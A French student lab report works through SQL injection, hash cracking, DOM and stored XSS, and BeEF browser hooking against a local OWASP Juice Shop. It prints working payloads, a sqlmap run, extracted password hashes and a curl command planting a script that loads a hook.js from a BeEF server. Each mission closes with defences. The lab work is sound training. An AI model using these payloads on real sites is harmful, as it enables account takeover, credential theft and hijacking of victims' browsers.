# TP4 - Sécurité web : quand une donnée devient une instruction

## Démarrage et Environnement

### Mise en route du laboratoire

L'environnement d'audit repose sur une instance locale d'OWASP Juice Shop déployée via Docker sur notre VM Kali Linux, accompagnée de Burp Suite Community Edition et de BeEF-XSS pour la finale.

#### Commandes exécutées :

```bash
docker compose up -d
# Vérification de la disponibilité de l'application sur http://127.0.0.1:3001
# Lancement de BeEF-XSS pour la finale :
beef-xss-start
```

#### Périmètre et outils :

* **Cible :** OWASP Juice Shop accessible sur `[http://127.0.0.1:3001](http://127.0.0.1:3001)`.
* **Proxy d'interception :** Navigateur intégré à Burp Suite Community Edition.
* **Outils complémentaires :** `sqlmap` (v1.10.6), `john` (John the Ripper), `curl` et BeEF (`[http://127.0.0.1:3000/ui/panel](http://127.0.0.1:3000/ui/panel)`).
* **Score Board :** Accessible sur `/#/score-board` pour suivre la résolution des défis.

#### Preuve (Capture d'écran) :

<img width="1599" height="848" alt="19" src="https://github.com/user-attachments/assets/422e4187-cd33-4c8f-99d1-650b94dde800" />

* Démarrage de Juice Shop (`Juice Shop est prêt (200)`) et lancement du service `beef-xss-start` exposant l'interface web sur `[http://127.0.0.1:3000/ui/panel](http://127.0.0.1:3000/ui/panel)` et le script de hook `[http://127.0.0.1:3000/hook.js](http://127.0.0.1:3000/hook.js)`.

---

## Mission 1 - Se connecter en admin sans son mot de passe (SQL Injection)

### 1. Interception et modification de la requête d'authentification

Lors d'une tentative de connexion sur `/#/login` (par exemple avec `test@test.com`), la requête `POST /rest/user/login` est interceptée dans Burp Suite et envoyée dans **Repeater**.

En modifiant le champ `email` avec une injection SQL (`' OR 1=1--`), la clause `WHERE` de la requête SQL exécutée par le serveur est toujours vraie et renvoie le premier enregistrement de la table des utilisateurs (le compte administrateur).

#### Requête modifiée (principe dans Repeater) :

```json
{
  "email": "' OR 1=1--",
  "password": "test"
}
```

#### Résultat observé :

* Le serveur répond `HTTP/1.1 200 OK` avec un objet JSON `authentication` contenant un jeton JWT valide, `"bid": 1` et `"umail": "admin@juice-sh.op"`.
* Le défi **Login Admin** (*"Log in with the administrator's user account"*) est validé dans l'application.

#### Preuves (Captures d'écran) :

<img width="1596" height="850" alt="1" src="https://github.com/user-attachments/assets/f97e9ef5-967e-405e-8b44-a733213e0aa0" />

* Réponse `HTTP/1.1 200 OK` dans Burp Repeater retournant le token JWT et l'identité `"umail":"admin@juice-sh.op"`.

<img width="1012" height="830" alt="2" src="https://github.com/user-attachments/assets/c06b9d3a-c1da-4e6c-8062-ba1f90b150e4" />


* Bannière de validation du défi *Login Admin* dans OWASP Juice Shop.

### 2. Réponses aux questions d'analyse

1. **Pourquoi l'application a-t-elle validé une identité sans mot de passe valide ?**
   L'application construit sa requête SQL en concaténant directement la saisie utilisateur (`email`) dans la chaîne SQL (ex. `SELECT * FROM Users WHERE email = '<saisie>' AND password = '<hash>'`). L'apostrophe `'` ferme prématurément la chaîne de caractères, `OR 1=1` rend la condition globale toujours vraie, et `--` met en commentaire la vérification du mot de passe qui suit. La donnée envoyée devient ainsi une instruction SQL exécutée par la base de données.
2. **Défense adaptée :**
   * **Correction principale :** Utiliser des **requêtes paramétrées (préparées)** afin que la saisie utilisateur soit traitée strictement comme une valeur et jamais comme du code SQL.
   * **Défense en profondeur :** Configurer le compte de base de données de l'application avec le **principe du moindre privilège** (droits minimaux requis).

---

## Mission 2 - Lire plus que ce que la boutique affiche (SQL Injection UNION & sqlmap)

### 1. Détermination de la structure SQL et injection personnalisée

La barre de recherche interroge l'endpoint `GET /rest/products/search?q=...`.

#### Étapes réalisées dans Burp Repeater :

<img width="447" height="334" alt="3" src="https://github.com/user-attachments/assets/8fe47b79-839f-4bf3-acaf-0d1bef3c803f" />

<img width="796" height="824" alt="4" src="https://github.com/user-attachments/assets/5a33b4cf-3a51-42b4-acc8-5eaff852e8fa" />

1. **Fermeture de la syntaxe SQL :**
   ```http
   GET /rest/products/search?q=apple'))-- HTTP/1.1
   ```
   La requête renvoie `HTTP/1.1 200 OK` avec `"data": []`, confirmant que la requête SQL interne ferme la chaîne et deux parenthèses avant le commentaire `--`.

<img width="794" height="824" alt="5" src="https://github.com/user-attachments/assets/4483bed6-ddd7-49c3-ab37-5a1b2ec2badc" />

<img width="796" height="827" alt="6" src="https://github.com/user-attachments/assets/d349fa29-344f-4dd7-883f-82be7db54c6f" />


3. **Déduction du nombre de colonnes :**
   ```http
   GET /rest/products/search?q=apple'))%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10%20-- HTTP/1.1
   ```
   La requête réussit avec **10 colonnes**, reflétées dans les champs JSON (`"id": 1`, `"name": "2"`, `"description": "3"`, `"price": 4`, `"deluxePrice": 5`, `"image": "6"`, etc.).
4. **Affichage d'une donnée personnalisée :**

<img width="798" height="825" alt="7" src="https://github.com/user-attachments/assets/4b1d2780-37d6-4e20-83df-c906bf7c59a9" />

<img width="800" height="830" alt="8" src="https://github.com/user-attachments/assets/7becbfea-e2a8-478f-842b-ad4f81060ea2" />


   ```http
   GET /rest/products/search?q=apple'))%20UNION%20SELECT%201,%27TP4_BAPTISTE%27,3,4,5,6,7,8,9,10%20-- HTTP/1.1
   ```
   Le résultat JSON retourne `"name": "TP4_BAPTISTE"` dans la réponse.
5. **Extraction des identifiants depuis la table `Users` (`11.png`, `12.png`, `13.png`) :**
   ```http
   GET /rest/products/search?q=apple'))%20UNION%20SELECT%201,email,password,0,0,0,0,0,0,0%20FROM%20Users%20-- HTTP/1.1
   ```
   La réponse expose l'ensemble des comptes et de leurs hash MD5 dans les champs `name` et `description`, notamment :
   * `J12934@juice-sh.op` : `3c2abc04e4a6ea8f1327d0aae3714b7d`
   * `accountant@juice-sh.op` : `963e10f92a70b4b463220cb4c5d636dc`
   * `admin@juice-sh.op` : `0192023a7bbd73250516f069df18b500`

### 2. Vérification automatisée avec `sqlmap`

#### Commande exécutée :

```bash
sqlmap -u "http://127.0.0.1:3001/rest/products/search?q=apple" -p q --level=2 --technique=BEUS --flush-session --batch
```

#### Résultat observé :

<img width="1592" height="852" alt="9" src="https://github.com/user-attachments/assets/2dd11b3d-a620-4c21-ae52-50fce0b459a0" />

<img width="1599" height="847" alt="10" src="https://github.com/user-attachments/assets/8930a72d-5d7d-42d4-bf17-f344011db954" />

* `sqlmap` confirme que le paramètre GET `q` est vulnérable (*"GET parameter 'q' is vulnerable"*, notamment en `AND boolean-based blind - WHERE or HAVING clause`).
* Il identifie automatiquement le moteur de base de données sous-jacent : **`the back-end DBMS is SQLite`**.
* **Comparaison avec le raisonnement manuel :** L'outil automatise et accélère la détection des vecteurs d'injection et l'identification du SGBD (SQLite), mais il valide exactement l'hypothèse posée manuellement dans Burp Repeater sur le paramètre `q`.

#### Preuves (Captures d'écran) :

<img width="447" height="334" alt="3" src="https://github.com/user-attachments/assets/f6201e03-c91f-4c56-926d-ff012b011edb" />

<img width="796" height="824" alt="4" src="https://github.com/user-attachments/assets/1d232efe-45ed-481e-b671-002812b926df" />

* Test de fermeture de requête `q=apple'))--` et réponse `200 OK`.

<img width="794" height="824" alt="5" src="https://github.com/user-attachments/assets/05f1ee29-2952-4d0f-ae78-e7d4a66a6d79" />

<img width="796" height="827" alt="6" src="https://github.com/user-attachments/assets/22bfed39-5776-4cca-863e-7b18cedbc8ba" />


* Détection des 10 colonnes via `UNION SELECT 1,2,3,4,5,6,7,8,9,10 --`.

<img width="798" height="825" alt="7" src="https://github.com/user-attachments/assets/ff50f650-4eb5-4fe6-8ff1-645aa343c930" />

<img width="800" height="830" alt="8" src="https://github.com/user-attachments/assets/a6e7ed67-431f-4a39-9097-2e2b7cd0fdde" />

* Injection de la marque `'TP4_BAPTISTE'` affichée dans le JSON.

<img width="1592" height="852" alt="9" src="https://github.com/user-attachments/assets/f69f7c45-85e0-43f0-bf86-4fb4fc5efdf4" />

<img width="1599" height="847" alt="10" src="https://github.com/user-attachments/assets/43f1eeb5-335b-4d05-8f6d-9de426319029" />

* Lancement de `sqlmap` et confirmation de la vulnérabilité sur SQLite.

<img width="797" height="829" alt="11" src="https://github.com/user-attachments/assets/ddb7cfd6-0050-44b7-aeac-1c13cbbbea18" />

<img width="1597" height="844" alt="12" src="https://github.com/user-attachments/assets/cc9d07b6-d5da-4e0d-a92a-406d74cd7620" />

<img width="1599" height="829" alt="13" src="https://github.com/user-attachments/assets/483d368d-372f-4a2a-8367-538c054cc2db" />

* Extraction des emails et hash de mots de passe de la table `Users`.

### 3. Défenses (Mission 2)

1. **Défense qui corrige la faille :** Utiliser des **requêtes paramétrées (préparées)** pour isoler le paramètre `q` de la structure SQL.
2. **Défense qui limite l'impact si la première cède :** Configurer des **messages d'erreur génériques / avares** (ne jamais exposer les erreurs SQL brutes ni le nombre de colonnes au client) et restreindre les droits de l'utilisateur SQL.

---

## Bonus - Du hash au mot de passe (A04 Cryptographic Failures)

### 1. Cassage du hash MD5 de l'administrateur

Le hash MD5 récupéré pour `admin@juice-sh.op` (`0192023a7bbd73250516f069df18b500`) a été enregistré dans un fichier et attaqué par dictionnaire avec **John the Ripper** et la wordlist `rockyou.txt`.

#### Commandes exécutées :

```bash
echo "0192023a7bbd73250516f069df18b500" > hash.txt
time john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show --format=Raw-MD5 hash.txt
```

#### Résultat observé :

<img width="1599" height="854" alt="14" src="https://github.com/user-attachments/assets/4bcc2f94-e3bd-49b0-8f72-25114aebbd6d" />

* Mot de passe retrouvé en clair : **`admin123`**.
* Temps d'exécution mesuré par `time` : **`0.21s`** (`real 0.21s`).

#### Preuve (Capture d'écran) :

* Terminal montrant le cassage du hash MD5 en 0,21 seconde et l'affichage de `?:admin123`.

<img width="1599" height="854" alt="14" src="https://github.com/user-attachments/assets/f852a799-7d9c-4c2b-8329-c02a1e16e49d" />


### 2. Pourquoi est-ce si rapide et quelle est la parade ?

* **Pourquoi c'est rapide :** MD5 est une fonction de hachage cryptographique obsolète, conçue pour être très rapide à calculer (plusieurs millions de candidats testés par seconde), et les hash sont stockés **sans sel (salt)**. Un mot de passe courant présent dans `rockyou.txt` tombe donc en une fraction de seconde.
* **La parade :** Utiliser une fonction de hachage **lente et salée** dédiée aux mots de passe comme **bcrypt** ou **Argon2**. Le sel unique par utilisateur rend les *rainbow tables* inutilisables, et le facteur de coût (lenteur volontaire) rend les attaques par dictionnaire ou force brute beaucoup trop coûteuses en temps et en calcul.

---

## Mission 3 - Faire exécuter votre code chez un autre utilisateur (XSS)

### 1. DOM XSS (Exécution locale via l'URL)

En injectant une balise `<iframe>` dans le paramètre de recherche `q` de l'URL :

```text
http://127.0.0.1:3001/#/search?q=<iframe%20src%3D"javascript:alert(%60xss_dom%60)">
```

Le code JavaScript s'exécute immédiatement dans le DOM de notre propre navigateur et affiche la boîte de dialogue `xss_dom`.

<img width="1599" height="829" alt="15" src="https://github.com/user-attachments/assets/c9ff9295-298c-44e9-ac35-d328724e78c6" />

### 2. XSS Stockée (Persistance et exécution chez l'administrateur)

1. Lors de la création d'un compte utilisateur via `/#/register` (`POST /api/Users/`), la requête est interceptée dans Burp Repeater pour contourner la validation côté client et injecter un payload dans le champ `email` :
   ```json
   {
     "email": "<img src=x onerror=alert(1)>@test.com",
     "password": "123456",
     "passwordRepeat": "123456",
     "securityQuestion": {
       "id": 2,
       "question": "Mother's maiden name?"
     },
     "securityAnswer": "sfsf"
   }
   ```

<img width="796" height="849" alt="16" src="https://github.com/user-attachments/assets/059a54d5-c279-4d0c-af1e-5b73217227de" />

<img width="797" height="829" alt="17" src="https://github.com/user-attachments/assets/226650c8-2e3a-45e0-a38d-433821de15b2" />

2. En se connectant ensuite avec le compte administrateur (`admin@juice-sh.op`) et en ouvrant la page `/#/administration`, le navigateur rend la liste des utilisateurs enregistrés : l'image invalide `src=x` déclenche l'événement `onerror` et exécute `alert(1)` dans la session de l'administrateur.

<img width="794" height="829" alt="18" src="https://github.com/user-attachments/assets/c9ee9091-df87-43dd-adb3-ab1a33c95447" />

#### Preuves (Captures d'écran) :

* Alerte `xss_dom` déclenchée depuis la barre de recherche (DOM XSS).

<img width="1599" height="829" alt="15" src="https://github.com/user-attachments/assets/33da48b3-9a2d-4502-9619-b568c7697a9a" />

* `16.png` & `17.png` : Création d'utilisateur sur `/#/register` et injection de `<img src=x onerror=alert(1)>@test.com` dans Burp Repeater.

<img width="796" height="849" alt="16" src="https://github.com/user-attachments/assets/f7bb1d76-6a98-48d6-befb-8bb66f7af338" />

<img width="797" height="829" alt="17" src="https://github.com/user-attachments/assets/c8d4e713-3fad-409f-883a-5da0d56570e1" />

* Déclenchement de la popup `1` lors de la consultation de `/#/administration` en tant qu'administrateur.

<img width="794" height="829" alt="18" src="https://github.com/user-attachments/assets/4b2d57c5-cae3-40d1-ab02-25215344c3d9" />

### 3. Analyse et Défenses (Mission 3)

* **Qui a envoyé le code et qui l'exécute ?** L'attaquant (ou utilisateur malveillant) a envoyé le payload lors de son inscription ; c'est le **navigateur de la victime** (ici l'administrateur consultant `/#/administration`) qui l'exécute côté client dans le contexte de sa propre session authentifiée.
* **Pourquoi le stockage change l'ampleur ?** Contrairement à une XSS réfléchie ou DOM qui nécessite que la victime clique sur un lien piégé précis, une **XSS stockée** est enregistrée en base de données côté serveur : elle se déclenche automatiquement chez **tout utilisateur ou administrateur** qui consulte la page légitime affichant cette donnée, sans action supplémentaire.
* **Défenses :**
  1. **Encodage en sortie (Output Encoding)** adapté au contexte (HTML, attribut, JavaScript) pour que la saisie reste affichée comme du texte brut.
  2. **Cookies de session `HttpOnly`** (empêchant JavaScript de lire le cookie via `document.cookie`), `SameSite` et `Secure`.
  3. **Politique CSP (Content Security Policy)** restreignant l'exécution de scripts inline et les sources de scripts autorisées.

---

## Finale - Prise de main sur le navigateur avec BeEF

### 1. Montage et limite expérimentale

* **Montage appliqué :** Repli local (*fallback*) sur une seule VM Kali Linux hébergeant à la fois OWASP Juice Shop (`:3001`) et le serveur BeEF (`:3000`).
* **Limite d'environnement :** La démonstration a été réalisée dans un seul profil navigateur (deux onglets côte à côte : *BeEF Control Panel* et *OWASP Juice Shop*), alors qu'en condition idéale on utilise deux machines distinctes ou deux profils navigateur séparés afin d'isoler strictement les cookies et sessions.

### 2. Injection du hook BeEF et accrochage de la victime

1. Un utilisateur contenant le script de hook BeEF (`[http://127.0.0.1:3000/hook.js](http://127.0.0.1:3000/hook.js)`) dans son email est créé via l'API `POST /api/Users/` :
   ```bash
   cat << 'EOF' > /tmp/payload_finale.json
   {"email":"<img src=x onerror=\"var s=document.createElement('script');s.src='http://127.0.0.1:3000/hook.js';document.body.appendChild(s);\">@finale.local","password":"Password123!","passwordRepeat":"Password123!","securityQuestion":{"id":2},"securityAnswer":"test"}
   EOF

   curl -i -X POST http://127.0.0.1:3001/api/Users/ \
     -H "Content-Type: application/json" \
     --data-binary @/tmp/payload_finale.json
   ```
   Le serveur répond `HTTP/1.1 201 Created` avec l'utilisateur `"id": 25` (`@finale.local`).
2. Lorsque l'administrateur ouvre `/#/administration`, le navigateur charge `hook.js` sans rien installer ni télécharger : le navigateur (`127.0.0.1`) apparaît immédiatement dans **Online Browsers** sur le panneau BeEF (`21.png`, `23.png`).
3. Depuis l'onglet **Commands** de BeEF (`Module Results History`), deux commandes sont lancées (`command 1` et `command 2`), notamment le module **Fake Notification Bar** (ID `18`), affichant une fausse bannière de mise à jour Java en haut de la page Juice Shop de la victime (`21.png`, `22.png`).

#### Preuves (Captures d'écran) :

* Création de l'utilisateur `"id": 25` (`@finale.local`) avec le payload `hook.js` (`HTTP/1.1 201 Created`).

<img width="1599" height="855" alt="20" src="https://github.com/user-attachments/assets/b605049c-aaa6-4d0f-9487-bcbc419c6a91" />

* Panneau BeEF montrant le navigateur `127.0.0.1` dans *Online Browsers*, l'historique des 2 commandes exécutées et la configuration de *Fake Notification Bar*.

<img width="1597" height="826" alt="21" src="https://github.com/user-attachments/assets/d69c349b-9429-45a7-af6e-eeab5f1b7246" />

* Affichage de la fausse barre de notification en haut de la page `/#/administration` côté victime.

<img width="1597" height="835" alt="22" src="https://github.com/user-attachments/assets/185da702-7c59-4e8a-96af-6f6b21453b2d" />

* Détail de `User #25` dans l'interface d'administration confirmant le payload stocké.

<img width="1597" height="848" alt="23" src="https://github.com/user-attachments/assets/e6b48247-8f93-4171-9c6e-e67852248ade" />

### 3. Synthèse : HTTPS et Défense en profondeur

* **Pourquoi le cadenas HTTPS ne protège pas ici :** HTTPS chiffre et authentifie le **transport** réseau entre le client et le serveur, mais il ne vérifie pas la sécurité du code applicatif. Une fois la page déchiffrée par le navigateur, le script malveillant stocké en base s'exécute normalement.
* **Défense :**
  * **Couper le problème à la racine :** Encodage en sortie pour empêcher toute XSS.
  * **Défense en profondeur :** Une **CSP** interdisant les scripts externes empêche le chargement de `[http://127.0.0.1:3000/hook.js](http://127.0.0.1:3000/hook.js)`, et des cookies `HttpOnly`, `SameSite`, `Secure` limitent les données sensibles accessibles.
